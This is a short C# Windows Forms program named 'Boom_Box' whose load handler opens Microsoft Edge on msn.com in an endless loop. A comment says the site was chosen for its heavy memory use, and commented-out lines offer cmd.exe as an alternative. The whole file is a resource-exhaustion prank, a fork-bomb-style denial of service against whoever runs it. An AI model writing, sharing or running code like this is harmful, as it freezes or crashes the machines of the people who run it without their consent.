using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Diagnostics;


namespace Boom_Box
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            while (true)
            {
                Process.Start("microsoftedge.exe", "msn.com");
                //we use msn.com because they need lots of memory sources

                //you can use this also
                //Process.Start("microsoftedge.exe");
                //Process.Start("cmd.exe");
            }
        }
    }
}
